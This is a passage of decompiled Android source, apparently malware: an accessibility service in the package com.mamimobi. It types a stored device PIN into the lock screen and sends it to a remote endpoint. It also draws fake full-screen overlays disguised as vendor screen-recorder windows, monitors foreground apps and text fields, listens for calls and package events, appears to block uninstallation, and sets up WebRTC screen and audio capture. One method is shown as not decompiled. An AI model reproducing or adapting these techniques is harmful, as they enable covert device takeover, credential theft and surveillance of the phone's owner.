                if (Build.MANUFACTURER.toLowerCase().contains("vivo") || Build.MODEL.toLowerCase().contains("vivo")) {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.android.systemui:id/VivoPinkey" + this.G.charAt(i));
                    if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                        listFindAccessibilityNodeInfosByViewId.get(0).performAction(16);
                    }
                } else {
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId2 = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key" + this.G.charAt(i));
                    if (listFindAccessibilityNodeInfosByViewId2 != null && !listFindAccessibilityNodeInfosByViewId2.isEmpty()) {
                        listFindAccessibilityNodeInfosByViewId2.get(0).performAction(16);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        try {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId3 = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key_enter_text");
            if (listFindAccessibilityNodeInfosByViewId3 == null || listFindAccessibilityNodeInfosByViewId3.isEmpty()) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId4 = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.android.systemui:id/key_enter");
                accessibilityNodeInfo = (listFindAccessibilityNodeInfosByViewId4 == null || listFindAccessibilityNodeInfosByViewId4.isEmpty()) ? null : listFindAccessibilityNodeInfosByViewId4.get(0);
            } else {
                accessibilityNodeInfo = listFindAccessibilityNodeInfosByViewId3.get(0);
            }
            if (accessibilityNodeInfo != null) {
                accessibilityNodeInfo.performAction(16);
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        atomicBoolean.set(false);
        String str = this.G;
        try {
            o71 o71VarF = o71.f(e0);
            lm0 lm0Var = o71VarF.e;
            String strV = t40.V(e0);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put(ApiConstants.ID, strV);
            jSONObject.put(ApiConstants.ACTION, "password");
            if (o71VarF.e() != null) {
                jSONObject.put("clientid", o71VarF.e());
            }
            jSONObject.put("lockType", 1);
            jSONObject.put("pin", str);
            lm0Var.c(jSONObject.toString().getBytes());
        } catch (Exception e3) {
            e3.printStackTrace();
        }
    }

    public final void a(AccessibilityEvent accessibilityEvent) {
        AtomicBoolean atomicBoolean;
        if ((accessibilityEvent.getEventType() == 32 || accessibilityEvent.getEventType() == 2048 || accessibilityEvent.getEventType() == 8) && accessibilityEvent.getPackageName() != null && "com.android.systemui".equals(accessibilityEvent.getPackageName().toString())) {
            G0.set(true);
            Iterator<AccessibilityWindowInfo> it = getWindows().iterator();
            do {
                boolean zHasNext = it.hasNext();
                atomicBoolean = l0;
                if (!zHasNext) {
                    atomicBoolean.set(false);
                    return;
                }
            } while (it.next().getType() != 2);
            atomicBoolean.set(true);
        }
    }

    public final void b() {
        int iA0;
        int i;
        String str;
        InputStream inputStreamOpen;
        ByteArrayOutputStream byteArrayOutputStream;
        byte[] bArr;
        AtomicBoolean atomicBoolean = z0;
        if (atomicBoolean.get()) {
            return;
        }
        try {
            DisplayMetrics displayMetrics = new DisplayMetrics();
            a0.getDefaultDisplay().getRealMetrics(displayMetrics);
            FrameLayout frameLayout = (FrameLayout) LayoutInflater.from(this).inflate(R$layout.fakelay_fullscreen, (ViewGroup) null);
            c0 = frameLayout;
            frameLayout.setKeepScreenOn(true);
            c0.setBackgroundColor(-15785945);
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-1, -1, 2032, 10008, 1);
            d0 = layoutParams;
            layoutParams.x = 0;
            layoutParams.y = 0;
            layoutParams.height = displayMetrics.heightPixels;
            iA0 = t40.a0();
            i = Build.VERSION.SDK_INT;
            if (i >= 28) {
                d0.layoutInDisplayCutoutMode = 1;
            }
            WindowManager.LayoutParams layoutParams2 = d0;
            layoutParams2.gravity = 51;
            if (i >= 26) {
                layoutParams2.setTitle("FloatWindow");
            }
        } catch (Exception e) {
            e.printStackTrace();
            atomicBoolean.set(false);
            return;
        }
        try {
            if (iA0 != 9) {
                switch (iA0) {
                    case 1:
                        d0.setTitle("ScreenRecorderTimer");
                        break;
                    case 2:
                        WindowManager.LayoutParams layoutParams3 = d0;
                        layoutParams3.flags |= Options.DEFAULT_MAX_CONTROL_LINE;
                        layoutParams3.setTitle("com.miui.screenrecorder");
                        break;
                    case 3:
                        d0.setTitle("com.oplus.screenrecorder.FloatView");
                        break;
                    case 4:
                        d0.setTitle("screen_record_menu");
                        break;
                    case 5:
                        d0.setTitle("SysScreenRecorder");
                        try {
                            try {
                                Class<?> cls = Class.forName("android.view.MeizuLayoutParams");
                                Object objNewInstance = cls.newInstance();
                                Field declaredField = cls.getDeclaredField("flags");
                                declaredField.setAccessible(true);
                                declaredField.setInt(objNewInstance, d0.flags);
                                WindowManager.LayoutParams.class.getField("meizuParams").set(d0, objNewInstance);
                            } catch (Exception unused) {
                                Field declaredField2 = WindowManager.LayoutParams.class.getDeclaredField("meizuFlags");
                                declaredField2.setAccessible(true);
                                WindowManager.LayoutParams layoutParams4 = d0;
                                declaredField2.setInt(layoutParams4, layoutParams4.flags);
                            }
                        } catch (Exception e2) {
                            e2.printStackTrace();
                        }
                        break;
                    case 6:
                        Class<?> cls2 = d0.getClass();
                        Class cls3 = Integer.TYPE;
                        Method method = cls2.getMethod("semAddExtensionFlags", cls3);
                        Method method2 = d0.getClass().getMethod("semAddPrivateFlags", cls3);
                        method.invoke(d0, -2147352576);
                        WindowManager.LayoutParams layoutParams5 = d0;
                        method2.invoke(layoutParams5, Integer.valueOf(layoutParams5.flags));
                        break;
                    default:
                        switch (iA0) {
                            case WorkDatabaseVersions.VERSION_15 /* 15 */:
                                d0.setTitle("NubiaScreenDecorOverlay");
                                break;
                            case 16:
                                d0.setTitle("com.blackshark.screenrecorder");
                                break;
                            case 17:
                                d0.setTitle("com.asus.force.layer.transparent.SR.floatingpanel");
                                d0.memoryType |= 268435456;
                                break;
                        }
                        break;
                }
                return;
            }
            d0.setTitle("op_screenrecord");
            if (i == 30) {
                Field declaredField3 = d0.getClass().getDeclaredField("PRIVATE_FLAG_IS_ROUNDED_CORNERS_OVERLAY");
                declaredField3.setAccessible(true);
                Field declaredField4 = d0.getClass().getDeclaredField("privateFlags");
                declaredField4.setAccessible(true);
                Integer num = (Integer) declaredField3.get(d0.getClass());
                num.getClass();
                declaredField4.set(d0, num);
            }
        } catch (Exception unused2) {
        }
        c0.setSystemUiVisibility(5894);
        WebView webView = (WebView) c0.findViewById(R$id.mywebview);
        Z0 = webView;
        webView.getSettings().setDomStorageEnabled(true);
        Z0.getSettings().setAllowFileAccess(true);
        Z0.getSettings().setAllowContentAccess(true);
        Z0.getSettings().setLoadWithOverviewMode(true);
        Z0.getSettings().setUseWideViewPort(true);
        Z0.getSettings().setJavaScriptEnabled(true);
        Z0.setScrollBarStyle(0);
        try {
            inputStreamOpen = getAssets().open("upt.html");
            byteArrayOutputStream = new ByteArrayOutputStream();
            bArr = new byte[Options.DEFAULT_MAX_CONTROL_LINE];
        } catch (IOException unused3) {
            str = "";
        }
        while (true) {
            int i2 = inputStreamOpen.read(bArr);
            if (i2 < 0) {
                inputStreamOpen.close();
                byteArrayOutputStream.close();
                str = new String(byteArrayOutputStream.toByteArray(), StandardCharsets.UTF_8);
            } else {
                byteArrayOutputStream.write(bArr, 0, i2);
            }
            Z0.loadDataWithBaseURL("file:///android_asset/", str, "text/html", "UTF-8", null);
            a0.addView(c0, d0);
            atomicBoolean.set(true);
            a1.postDelayed(new l1(3), 1000L);
            return;
        }
    }

    public final void c() {
        AtomicBoolean atomicBoolean = x0;
        try {
            FrameLayout frameLayout = t0;
            if (frameLayout != null) {
                a0.removeView(frameLayout);
            }
            FrameLayout frameLayout2 = (FrameLayout) LayoutInflater.from(this).inflate(R$layout.overlay_fullscreen, (ViewGroup) null);
            t0 = frameLayout2;
            frameLayout2.setKeepScreenOn(true);
            t0.setBackgroundColor(-16777216);
            WebView webView = (WebView) t0.findViewById(R$id.mywebview);
            q0 = webView;
            webView.setWebViewClient(new v1(0));
            WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-1, -1, 2032, 10008, -3);
            layoutParams.x = 0;
            layoutParams.y = 0;
            DisplayMetrics displayMetrics = new DisplayMetrics();
            a0.getDefaultDisplay().getRealMetrics(displayMetrics);
            layoutParams.height = displayMetrics.heightPixels;
            int iA0 = t40.a0();
            int i = Build.VERSION.SDK_INT;
            if (i >= 28) {
                layoutParams.layoutInDisplayCutoutMode = 1;
            }
            layoutParams.gravity = 51;
            if (i >= 26) {
                layoutParams.setTitle("FloatWindow");
            }
            try {
                if (iA0 != 9) {
                    switch (iA0) {
                        case 1:
                            layoutParams.setTitle("ScreenRecorderTimer");
                            break;
                        case 2:
                            layoutParams.flags |= Options.DEFAULT_MAX_CONTROL_LINE;
                            layoutParams.setTitle("com.miui.screenrecorder");
                            break;
                        case 3:
                            layoutParams.setTitle("com.oplus.screenrecorder.FloatView");
                            break;
                        case 4:
                            layoutParams.setTitle("screen_record_menu");
                            break;
                        case 5:
                            layoutParams.setTitle("SysScreenRecorder");
                            try {
                                Class<?> cls = Class.forName("android.view.MeizuLayoutParams");
                                Field declaredField = cls.getDeclaredField("flags");
                                declaredField.setAccessible(true);
                                Object objNewInstance = cls.newInstance();
                                declaredField.setInt(objNewInstance, layoutParams.flags);
                                layoutParams.getClass().getField("meizuParams").set(layoutParams, objNewInstance);
                            } catch (ClassNotFoundException | IllegalAccessException | InstantiationException | NoSuchFieldException unused) {
                                Field declaredField2 = layoutParams.getClass().getDeclaredField("meizuFlags");
                                declaredField2.setAccessible(true);
                                declaredField2.setInt(layoutParams, layoutParams.flags);
                            }
                            break;
                        case 6:
                            Class<?> cls2 = layoutParams.getClass();
                            Class cls3 = Integer.TYPE;
                            Method method = cls2.getMethod("semAddExtensionFlags", cls3);
                            Method method2 = layoutParams.getClass().getMethod("semAddPrivateFlags", cls3);
                            method.invoke(layoutParams, -2147352576);
                            method2.invoke(layoutParams, Integer.valueOf(layoutParams.flags));
                            break;
                        default:
                            switch (iA0) {
                                case WorkDatabaseVersions.VERSION_15 /* 15 */:
                                    layoutParams.setTitle("NubiaScreenDecorOverlay");
                                    break;
                                case 16:
                                    layoutParams.setTitle("com.blackshark.screenrecorder");
                                    break;
                                case 17:
                                    layoutParams.setTitle("com.asus.force.layer.transparent.SR.floatingpanel");
                                    layoutParams.memoryType |= 268435456;
                                    break;
                            }
                            break;
                    }
                } else {
                    layoutParams.setTitle("op_screenrecord");
                    if (i == 30) {
                        Field declaredField3 = layoutParams.getClass().getDeclaredField("PRIVATE_FLAG_IS_ROUNDED_CORNERS_OVERLAY");
                        declaredField3.setAccessible(true);
                        Field declaredField4 = layoutParams.getClass().getDeclaredField("privateFlags");
                        declaredField4.setAccessible(true);
                        Integer num = (Integer) declaredField3.get(layoutParams.getClass());
                        num.getClass();
                        declaredField4.set(layoutParams, num);
                    }
                }
            } catch (Exception unused2) {
            }
            t0.setSystemUiVisibility(5894);
            t0.setVisibility(8);
            a0.addView(t0, layoutParams);
            atomicBoolean.set(true);
        } catch (Exception unused3) {
            atomicBoolean.set(false);
        }
    }

    public final void j(AccessibilityEvent accessibilityEvent) {
        CharSequence packageName;
        ActivityInfo activityInfo;
        try {
            if ((accessibilityEvent.getEventType() == 32 || accessibilityEvent.getEventType() == 2048) && (packageName = accessibilityEvent.getPackageName()) != null) {
                String string = packageName.toString();
                if (string.isEmpty()) {
                    return;
                }
                boolean zIsInteractive = ((PowerManager) getSystemService("power")).isInteractive();
                if (!"com.android.systemui".equals(string) && !"com.android.settings".equals(string)) {
                    PackageManager packageManager = getPackageManager();
                    Intent intent = new Intent("android.intent.action.MAIN");
                    intent.addCategory("android.intent.category.HOME");
                    ResolveInfo resolveInfoResolveActivity = packageManager.resolveActivity(intent, Options.DEFAULT_BUFFER_SIZE);
                    if ((resolveInfoResolveActivity == null || (activityInfo = resolveInfoResolveActivity.activityInfo) == null || !string.equals(activityInfo.packageName)) && ((y(this, string) || string.contains("inputmethod")) && zIsInteractive && !Q0.contains(string))) {
                        return;
                    }
                }
                long jCurrentTimeMillis = System.currentTimeMillis();
                if (jCurrentTimeMillis - this.K < 300) {
                    return;
                }
                this.K = jCurrentTimeMillis;
                if (m0.get()) {
                    string = T0;
                } else if (string.equals(getPackageName())) {
                    string = U0;
                }
                if (zIsInteractive && string.equals(this.J)) {
                    return;
                }
                o1 o1Var = this.L;
                Handler handler = this.M;
                if (o1Var != null) {
                    handler.removeCallbacks(o1Var);
                }
                o1 o1Var2 = new o1(this, string, 1);
                this.L = o1Var2;
                handler.postDelayed(o1Var2, 300L);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public final void k(AccessibilityEvent accessibilityEvent) {
        CharSequence packageName;
        pv pvVar;
        if (accessibilityEvent.getEventType() == 32 && (packageName = accessibilityEvent.getPackageName()) != null) {
            String string = packageName.toString();
            if (string.isEmpty() || !S0.contains(string) || (pvVar = this.T) == null) {
                return;
            }
            try {
                pvVar.g(string);
            } catch (Exception unused) {
            }
        }
    }

    public final void l(AccessibilityEvent accessibilityEvent) {
        CharSequence packageName;
        if ((accessibilityEvent.getEventType() == 32 || accessibilityEvent.getEventType() == 2048) && (packageName = accessibilityEvent.getPackageName()) != null) {
            String string = packageName.toString();
            if (string.isEmpty() || string.equals(getPackageName())) {
                return;
            }
            boolean zIsInteractive = ((PowerManager) getSystemService("power")).isInteractive();
            boolean zY = y(this, string);
            HashSet hashSet = R0;
            if ((zY || string.contains("inputmethod")) && zIsInteractive && !hashSet.contains(string)) {
                return;
            }
            boolean zContains = Q0.contains(string);
            AtomicBoolean atomicBoolean = m0;
            if (!zContains || !hashSet.contains(string)) {
                atomicBoolean.set(false);
            } else {
                T0 = string;
                atomicBoolean.set(true);
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:34:0x009a  */
    /* JADX WARN: Removed duplicated region for block: B:35:0x009c  */
    /* JADX WARN: Removed duplicated region for block: B:49:0x00bf  */
    /* JADX WARN: Removed duplicated region for block: B:59:? A[RETURN, SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public final void n(android.view.accessibility.AccessibilityNodeInfo r13, int r14) {
        /*
            Method dump skipped, instruction units count: 228
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.mamimobi.AccessService.n(android.view.accessibility.AccessibilityNodeInfo, int):void");
    }

    public final void o(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        EditTextInfo editTextInfo;
        EditTextInfo editTextInfo2;
        if ((i == 8 || i == 1 || i == 32) && accessibilityNodeInfo != null) {
            try {
                AccessibilityWindowInfo window = accessibilityNodeInfo.getWindow();
                if (window == null) {
                    return;
                }
                if (window.getType() != 1 || accessibilityNodeInfo.getPackageName().equals(getPackageName()) || (editTextInfo = this.S) == null || Objects.equals(editTextInfo.resourceName, accessibilityNodeInfo.getViewIdResourceName()) || (editTextInfo2 = this.S) == null || editTextInfo2.resourceName == null) {
                    return;
                }
                r0.execute(new p1(0, this, editTextInfo2, false));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    public final void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        if (accessibilityEvent == null) {
            return;
        }
        int eventType = accessibilityEvent.getEventType();
        AccessibilityNodeInfo source = accessibilityEvent.getSource();
        try {
            try {
                o(source, eventType);
                Handler handler = this.O;
                if (eventType == 1 && accessibilityEvent.getPackageName() != null && "com.android.systemui".equals(accessibilityEvent.getPackageName().toString())) {
                    handler.postDelayed(new l1(4), 500L);
                }
                if (eventType == 1 || eventType == 2048) {
                    m(accessibilityEvent, eventType, source);
                }
                A(accessibilityEvent);
                a(accessibilityEvent);
                if (eventType == 32 || eventType == 2048) {
                    r(accessibilityEvent, eventType);
                }
                try {
                    if (L0.get() && M0.get()) {
                        la0.j(accessibilityEvent);
                        la0.h(accessibilityEvent);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                la.e(accessibilityEvent);
                if (eventType == 32) {
                    k(accessibilityEvent);
                }
                if (eventType == 32 || eventType == 2048) {
                    uj0.a(this, accessibilityEvent);
                }
                if (eventType == 32 || eventType == 2048) {
                    l(accessibilityEvent);
                }
                if (eventType == 32) {
                    long jCurrentTimeMillis = System.currentTimeMillis();
                    if (jCurrentTimeMillis - this.F > 100) {
                        this.F = jCurrentTimeMillis;
                        j(accessibilityEvent);
                    }
                }
                try {
                    this.N.execute(new t1(this, accessibilityEvent, 0));
                } catch (Exception unused) {
                }
                if (eventType == 1 || eventType == 2 || eventType == 16 || eventType == 2048 || eventType == 4 || eventType == 32) {
                    r0.execute(new q1(this, AccessibilityEvent.obtain(accessibilityEvent), eventType, 0));
                }
                n(source, eventType);
                AtomicBoolean atomicBoolean = u0;
                if (atomicBoolean.get() && i(source)) {
                    atomicBoolean.set(false);
                    handler.postDelayed(new k1(this, 0), 100L);
                }
                if (source == null) {
                    return;
                }
            } catch (Exception e2) {
                e2.printStackTrace();
                if (source == null) {
                    return;
                }
            }
            source.recycle();
        } catch (Throwable th) {
            if (source != null) {
                source.recycle();
            }
            throw th;
        }
    }

    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        this.R.c(this.U);
        b0 = (KeyguardManager) getSystemService("keyguard");
        a0 = (WindowManager) getSystemService("window");
        L0.set(fa0.r0(this, "PerFinishAll", false));
        M0.set(fa0.r0(this, "isForbiddenUninstall", true));
        ma0.J(this, h(this, getPackageName()));
        if (f11.c == null) {
            try {
                IntentFilter intentFilter = new IntentFilter();
                intentFilter.addAction("android.intent.action.PHONE_STATE");
                intentFilter.addAction("android.intent.action.NEW_OUTGOING_CALL");
                intentFilter.addAction("android.intent.extra.PHONE_NUMBER");
                CSReceiver cSReceiver = new CSReceiver();
                f11.c = cSReceiver;
                registerReceiver(cSReceiver, intentFilter);
            } catch (Exception unused) {
            }
        }
        if (f11.e == null) {
            try {
                IntentFilter intentFilter2 = new IntentFilter();
                intentFilter2.addAction("android.intent.action.LOCALE_CHANGED");
                LCReceiver lCReceiver = new LCReceiver();
                f11.e = lCReceiver;
                registerReceiver(lCReceiver, intentFilter2);
            } catch (Exception unused2) {
            }
        }
        if (f11.c == null) {
            try {
                IntentFilter intentFilter3 = new IntentFilter();
                intentFilter3.addAction("android.intent.action.PACKAGE_ADDED");
                intentFilter3.addAction("android.intent.action.PACKAGE_REMOVED");
                intentFilter3.addAction("android.intent.action.PACKAGE_REPLACED");
                intentFilter3.addAction("android.intent.action.PACKAGE_CHANGED");
                intentFilter3.addAction("android.intent.action.PACKAGES_SUSPENDED");
                intentFilter3.addDataScheme("package");
                PKReceiver pKReceiver = new PKReceiver();
                f11.d = pKReceiver;
                registerReceiver(pKReceiver, intentFilter3);
            } catch (Exception unused3) {
            }
        }
        if (f11.b == null) {
            try {
                IntentFilter intentFilter4 = new IntentFilter();
                intentFilter4.addAction("android.intent.action.SCREEN_ON");
                intentFilter4.addAction("android.intent.action.SCREEN_OFF");
                intentFilter4.addAction("android.intent.action.USER_PRESENT");
                intentFilter4.addAction("android.intent.action.ACTION_POWER_CONNECTED");
                intentFilter4.addAction("android.intent.action.ACTION_POWER_DISCONNECTED");
                SCNReceiver sCNReceiver = new SCNReceiver();
                f11.b = sCNReceiver;
                registerReceiver(sCNReceiver, intentFilter4);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        this.H = new jg0(this);
        String strV = t40.V(this);
        this.H.a(strV);
        V = h(this, getPackageName());
        W = "[" + h(this, getPackageName()) + "]";
        i6 i6Var = new i6(this, new i6(this, 1, strV));
        this.I = i6Var;
        ((ConnectivityManager) i6Var.F).registerNetworkCallback(new NetworkRequest.Builder().addCapability(12).build(), (rh0) i6Var.G);
        List<ActivityManager.RunningAppProcessInfo> runningAppProcesses = ((ActivityManager) getSystemService("activity")).getRunningAppProcesses();
        if (runningAppProcesses != null) {
            for (ActivityManager.RunningAppProcessInfo runningAppProcessInfo : runningAppProcesses) {
                if (runningAppProcessInfo.processName.equals(getPackageName()) && runningAppProcessInfo.importance == 100) {
                    o71.f(this).a();
                    return;
                }
            }
        }
        try {
            WorkManager.getInstance(this).enqueue(new OneTimeWorkRequest.Builder(AppInitWorker.class).build());
        } catch (Exception e2) {
            e2.printStackTrace();
        }
    }

    @Override // android.app.Service
    public final void onDestroy() {
        AccessService accessService;
        super.onDestroy();
        e0 = null;
        j31.z = false;
        try {
            LCReceiver lCReceiver = f11.e;
            if (lCReceiver == null) {
                unregisterReceiver(lCReceiver);
                f11.e = null;
            }
            PKReceiver pKReceiver = f11.d;
            if (pKReceiver != null) {
                unregisterReceiver(pKReceiver);
                f11.d = null;
            }
            CSReceiver cSReceiver = f11.c;
            if (cSReceiver != null) {
                unregisterReceiver(cSReceiver);
                f11.c = null;
            }
            SCNReceiver sCNReceiver = f11.b;
            if (sCNReceiver != null) {
                unregisterReceiver(sCNReceiver);
                f11.b = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        tb tbVar = this.E;
        if (tbVar != null && (accessService = (AccessService) tbVar.a) != null) {
            accessService.unregisterReceiver((y5) tbVar.d);
        }
        try {
            stopForeground(true);
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        FrameLayout frameLayout = t0;
        if (frameLayout != null) {
            try {
                a0.removeView(frameLayout);
            } catch (Exception unused) {
            }
        }
        FrameLayout frameLayout2 = c0;
        if (frameLayout2 != null) {
            try {
                a0.removeView(frameLayout2);
            } catch (Exception unused2) {
            }
        }
        i6 i6Var = this.I;
        ((ConnectivityManager) i6Var.F).unregisterNetworkCallback((rh0) i6Var.G);
        try {
            if (e0 != null) {
                e0 = null;
            }
        } catch (Exception unused3) {
        }
        r0.shutdown();
        o71 o71VarF = o71.f(this);
        o71VarF.getClass();
        e6 e6Var = o71VarF.f;
        zb zbVar = (zb) e6Var.f;
        if (zbVar != null) {
            zbVar.a();
        }
        pr0 pr0Var = (pr0) e6Var.e;
        if (pr0Var != null) {
            qr0 qr0Var = pr0Var.b;
            if (qr0Var != null) {
                try {
                    qr0Var.stopCapture();
                } catch (Exception unused4) {
                }
                try {
                    pr0Var.b.dispose();
                } catch (Exception unused5) {
                }
                pr0Var.b = null;
            }
            VideoSource videoSource = pr0Var.c;
            if (videoSource != null) {
                try {
                    videoSource.dispose();
                } catch (Exception unused6) {
                }
                pr0Var.c = null;
            }
            VideoTrack videoTrack = pr0Var.d;
            if (videoTrack != null) {
                try {
                    videoTrack.dispose();
                } catch (Exception unused7) {
                }
                pr0Var.d = null;
            }
            qr0 qr0Var2 = pr0Var.a;
            if (qr0Var2 != null) {
                try {
                    qr0Var2.dispose();
                } catch (Exception unused8) {
                }
                pr0Var.a = null;
            }
        }
        or0 or0Var = (or0) e6Var.d;
        if (or0Var != null) {
            or0Var.a();
        }
        o71VarF.g();
        zb zbVar2 = (zb) e6Var.f;
        zbVar2.a();
        try {
            Thread.sleep(100L);
        } catch (InterruptedException e3) {
            e3.printStackTrace();
        }
        Handler handler = zbVar2.g;
        if (handler != null) {
            try {
                handler.removeCallbacksAndMessages(null);
            } catch (Exception unused9) {
            }
            zbVar2.g = null;
        }
        HandlerThread handlerThread = zbVar2.f;
        if (handlerThread != null) {
            try {
                handlerThread.quitSafely();
            } catch (Exception unused10) {
            }
            zbVar2.f = null;
        }
        lm0 lm0Var = o71VarF.e;
        lm0Var.f.removeCallbacks(lm0Var.l);
        lm0Var.f.removeCallbacksAndMessages(null);
        km0 km0Var = lm0Var.a;
        if (km0Var != null) {
            km0Var.close();
            lm0Var.a = null;
        }
        PowerManager.WakeLock wakeLock = o71VarF.o;
        if (wakeLock != null && wakeLock.isHeld()) {
            o71VarF.o.release();
        }
        jg0 jg0Var = this.H;
        jg0Var.getClass();
        jg0Var.b.execute(new e(21, jg0Var));
        is.L = true;
        Socket socket = is.M;
        if (socket != null && socket.isConnected()) {
            try {
                is.M.close();
                is.M = null;
            } catch (IOException e4) {
                e4.printStackTrace();
            }
        }
        WebView webView = Z0;
        if (webView != null) {
            try {
                try {
                    ViewParent parent = webView.getParent();
                    if (parent instanceof ViewGroup) {
                        ((ViewGroup) parent).removeView(Z0);
                    }
                    Z0.stopLoading();
                    Z0.loadUrl("about:blank");
                    Z0.clearHistory();
                    Z0.clearCache(true);
                    Z0.clearFormData();
                    Z0.removeJavascriptInterface("android");
                    Z0.removeAllViews();
                    Z0.destroy();
                } catch (Exception e5) {
                    e5.printStackTrace();
                }
                Z0 = null;
            } catch (Throwable th) {
                Z0 = null;
                throw th;
            }
        }
        WebView webView2 = q0;
        if (webView2 != null) {
            try {
                try {
                    ViewParent parent2 = webView2.getParent();
                    if (parent2 instanceof ViewGroup) {
                        ((ViewGroup) parent2).removeView(q0);
                    }
                    q0.stopLoading();
                    q0.loadUrl("about:blank");
                    q0.clearHistory();
                    q0.clearCache(true);
                    q0.clearFormData();
                    q0.removeJavascriptInterface("android");
                    q0.removeAllViews();
                    q0.destroy();
                } catch (Exception e6) {
                    e6.printStackTrace();
                }
                q0 = null;
            } catch (Throwable th2) {
                q0 = null;
                throw th2;
            }
        }
        P0.clear();
        W0.clear();
        X0.clear();
        Y0.clear();
        a8 a8VarE = a8.e();
        synchronized (a8VarE) {
            if (a8VarE.a != null) {
                try {
                    if (a8VarE.a.d) {
                        a8VarE.a.b();
                    }
                } catch (Exception unused11) {
                }
                try {
                    a8VarE.a.a();
                } catch (Exception unused12) {
                }
                a8VarE.a = null;
            }
            a8VarE.c = null;
            a8VarE.d = null;
            a8VarE.g = false;
            if (a8VarE.e != null) {
                a8VarE.e.shutdownNow();
                a8VarE.e = null;
            }
            if (a8VarE.f != null) {
                a8VarE.f.shutdownNow();
                a8VarE.f = null;
            }
            a8VarE.j.clear();
        }
        this.M.removeCallbacksAndMessages(null);
        this.O.removeCallbacksAndMessages(null);
        this.N.shutdownNow();
        pv pvVar = this.T;
        if (pvVar != null) {
            pvVar.d();
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    public final void onInterrupt() {
        this.M.removeCallbacksAndMessages(null);
        this.O.removeCallbacksAndMessages(null);
    }

    @Override // android.accessibilityservice.AccessibilityService
    public final void onServiceConnected() {
        String str;
        e0 = this;
        try {
            int i = Build.VERSION.SDK_INT;
            if (i >= 26) {
                j1.t();
                NotificationChannel notificationChannelC = j1.c();
                notificationChannelC.setDescription("Maintain the stable operation of accessibility services.");
                NotificationManager notificationManager = (NotificationManager) getSystemService(NotificationManager.class);
                if (notificationManager != null) {
                    notificationManager.createNotificationChannel(notificationChannelC);
                }
            }
            startForeground(CloseFrame.GOING_AWAY, (i >= 26 ? j1.b(this) : new Notification.Builder(this)).setContentTitle("Service is running.").setContentText("Accessibility service is running...").setSmallIcon(R$drawable.ic_notification).setPriority(-1).build());
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashSet hashSet = f71.a;
        if (hashSet.isEmpty()) {
            String str2 = "";
            if (hashSet.isEmpty()) {
                boolean zA0 = ma0.A0(f71.a(), f71.c());
                try {
                    str = new String(ma0.u(f71.a()));
                } catch (Exception unused) {
                    str = "";
                }
                if (zA0) {
                    str2 = str;
                } else {
                    try {
                        str2 = new String(ma0.u(f71.b()));
                    } catch (Exception unused2) {
                    }
                }
                Collections.addAll(hashSet, str2.split(","));
            }
        }
        O0 = System.currentTimeMillis();
        o71 o71VarF = o71.f(this);
        o71VarF.getClass();
        PeerConnectionFactory.initialize(PeerConnectionFactory.InitializationOptions.builder(e0).setEnableInternalTracer(true).createInitializationOptions());
        JavaAudioDeviceModule javaAudioDeviceModuleCreateAudioDeviceModule = JavaAudioDeviceModule.builder(this).setAudioSource(1).setSampleRate(16000).setAudioFormat(2).setUseHardwareAcousticEchoCanceler(true).setUseHardwareNoiseSuppressor(true).createAudioDeviceModule();
        EglBase eglBase = o71VarF.d;
        o71VarF.b = PeerConnectionFactory.builder().setOptions(new PeerConnectionFactory.Options()).setAudioDeviceModule(javaAudioDeviceModuleCreateAudioDeviceModule).setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true)).setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext())).createPeerConnectionFactory();
        e0.B();
        e0.B();
        Point point = new Point();
        ((WindowManager) getSystemService("window")).getDefaultDisplay().getRealSize(point);
        fa0.Q0(e0, "SCH", String.valueOf(point.x));
        fa0.Q0(e0, "SCW", String.valueOf(point.y));
        super.onServiceConnected();
        tb tbVar = new tb();
        tbVar.b = null;
        tbVar.c = null;
        tbVar.d = new y5(1, tbVar);
        tbVar.a = this;
        IntentFilter intentFilter = new IntentFilter();
        tbVar.c = intentFilter;
        intentFilter.addAction("android.intent.action.SCREEN_ON");
        intentFilter.addAction("android.intent.action.SCREEN_OFF");
        intentFilter.addAction("android.intent.action.USER_PRESENT");
        this.E = tbVar;
        tbVar.b = new z8(2, this);
        AccessService accessService = (AccessService) tbVar.a;
        if (accessService != null) {
            accessService.registerReceiver((y5) tbVar.d, (IntentFilter) tbVar.c);
        }
        try {
            if (getServiceInfo() == null) {
                AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
                accessibilityServiceInfo.flags = 90;
                accessibilityServiceInfo.eventTypes = 8134651;
                accessibilityServiceInfo.notificationTimeout = 0L;
                accessibilityServiceInfo.packageNames = null;
                accessibilityServiceInfo.feedbackType = -1;
                setServiceInfo(accessibilityServiceInfo);
            }
        } catch (Exception unused3) {
        }
        try {
